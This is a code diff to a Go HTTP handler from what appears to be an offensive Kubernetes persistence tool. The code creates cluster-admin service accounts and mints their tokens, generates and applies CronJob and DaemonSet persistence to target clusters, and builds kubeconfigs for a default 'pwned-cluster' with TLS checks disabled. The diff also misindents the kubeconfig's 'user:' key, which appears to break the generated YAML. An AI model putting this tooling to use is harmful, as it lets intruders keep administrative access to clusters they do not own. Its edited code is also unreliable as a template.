@@ -3,7 +3,10 @@ package handler
 import (
 	"context"
 	"fmt"
+	"net"
 	"net/http"
+	"net/url"
+	"strings"
 	"time"
 
 	"github.com/gin-gonic/gin"
@@ -16,20 +19,6 @@ import (
 type PersistHandler struct{}
 
 func NewPersistHandler() *PersistHandler { return &PersistHandler{} }
-
-func buildPersistClient(c *gin.Context) (*kubectl.Client, error) {
-	var req struct {
-		TargetHost string `json:"target_host" binding:"required"`
-		Token      string `json:"token"`
-		Username   string `json:"username"`
-		Password   string `json:"password"`
-		SkipTLS    bool   `json:"skip_tls"`
-	}
-	if err := c.ShouldBindJSON(&req); err != nil {
-		return nil, err
-	}
-	return kubectl.NewTargetClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
-}
 
 // CreateAdminSA 直接用 client-go 创建 SA + ClusterRoleBinding（无 kubectl 二进制依赖）
 func (h *PersistHandler) CreateAdminSA(c *gin.Context) {
@@ -136,12 +125,21 @@ func (h *PersistHandler) GetSAToken(c *gin.Context) {
 			s.Annotations["kubernetes.io/service-account.name"] == req.SAName {
 			token, ok := s.Data["token"]
 			if ok {
-				c.JSON(http.StatusOK, gin.H{"output": string(token)})
+				c.JSON(http.StatusOK, gin.H{"output": string(token), "source": "secret"})
 				return
 			}
 		}
 	}
-	c.JSON(http.StatusOK, gin.H{"output": "No token secret found for SA " + req.SAName + " in " + req.Namespace})
+
+	token, tokenErr := client.CreateServiceAccountToken(ctx, req.Namespace, req.SAName, 3600)
+	if tokenErr == nil {
+		c.JSON(http.StatusOK, gin.H{"output": token, "source": "tokenrequest"})
+		return
+	}
+
+	c.JSON(http.StatusOK, gin.H{
+		"error": fmt.Sprintf("No token secret found for SA %s in %s, and TokenRequest failed: %v", req.SAName, req.Namespace, tokenErr),
+	})
 }
 
 // GenerateCronJob 生成 CronJob YAML，并通过 client-go 直接创建
@@ -153,6 +151,7 @@ func (h *PersistHandler) GenerateCronJob(c *gin.Context) {
 		Image      string `json:"image"`
 		Schedule   string `json:"schedule"`
 		Command    string `json:"command"`
+		Apply      bool   `json:"apply"`
 		Token      string `json:"token"`
 		Username   string `json:"username"`
 		Password   string `json:"password"`
@@ -188,6 +187,15 @@ func (h *PersistHandler) GenerateCronJob(c *gin.Context) {
 		c.JSON(http.StatusOK, gin.H{"error": yamlErr.Error()})
 		return
 	}
+	if !req.Apply {
+		c.JSON(http.StatusOK, gin.H{
+			"yaml":      yaml,
+			"generated": true,
+			"applied":   false,
+			"preview":   true,
+		})
+		return
+	}
 
 	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
 	if err != nil {
@@ -209,6 +217,7 @@ func (h *PersistHandler) GenerateDaemonSet(c *gin.Context) {
 		Image      string `json:"image"`
 		MountPath  string `json:"mount_path"`
 		Command    string `json:"command"`
+		Apply      bool   `json:"apply"`
 		Token      string `json:"token"`
 		Username   string `json:"username"`
 		Password   string `json:"password"`
@@ -244,6 +253,15 @@ func (h *PersistHandler) GenerateDaemonSet(c *gin.Context) {
 		c.JSON(http.StatusOK, gin.H{"error": yamlErr.Error()})
 		return
 	}
+	if !req.Apply {
+		c.JSON(http.StatusOK, gin.H{
+			"yaml":      yaml,
+			"generated": true,
+			"applied":   false,
+			"preview":   true,
+		})
+		return
+	}
 
 	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
 	resp := gin.H{"yaml": yaml}
@@ -276,6 +294,7 @@ func (h *PersistHandler) GenerateKubeconfig(c *gin.Context) {
 	if req.Cluster == "" {
 		req.Cluster = "pwned-cluster"
 	}
+	server := normalizeKubeconfigServer(req.Server)
 
 	kcfg := fmt.Sprintf(`apiVersion: v1
 kind: Config
@@ -283,7 +302,7 @@ current-context: %[2]s
 clusters:
 - cluster:
     insecure-skip-tls-verify: true
-    server: https://%[1]s
+    server: %[1]s
   name: %[2]s
 contexts:
 - context:
@@ -292,10 +311,35 @@ contexts:
   name: %[2]s
 users:
 - name: admin
-  user:
+ user:
     token: %[3]s
-`, req.Server, req.Cluster, req.Token)
+`, server, req.Cluster, req.Token)
 	c.JSON(http.StatusOK, gin.H{"kubeconfig": kcfg})
+}
+
+func normalizeKubeconfigServer(server string) string {
+	s := strings.TrimSpace(server)
+	if s == "" {
+		return ""
+	}
+	if !strings.Contains(s, "://") {
+		s = "https://" + s
+	}
+	u, err := url.Parse(s)
+	if err != nil {
+		return s
+	}
+	if u.Host == "" && u.Path != "" {
+		u.Host = u.Path
+		u.Path = ""
+	}
+	if u.Scheme == "" {
+		u.Scheme = "https"
+	}
+	if u.Host != "" && u.Port() == "" {
+		u.Host = net.JoinHostPort(u.Hostname(), "6443")
+	}
+	return u.String()
 }
 
 // GenerateHostPersistence 生成宿主机持久化命令（仅输出命令，无 kubectl 依赖）
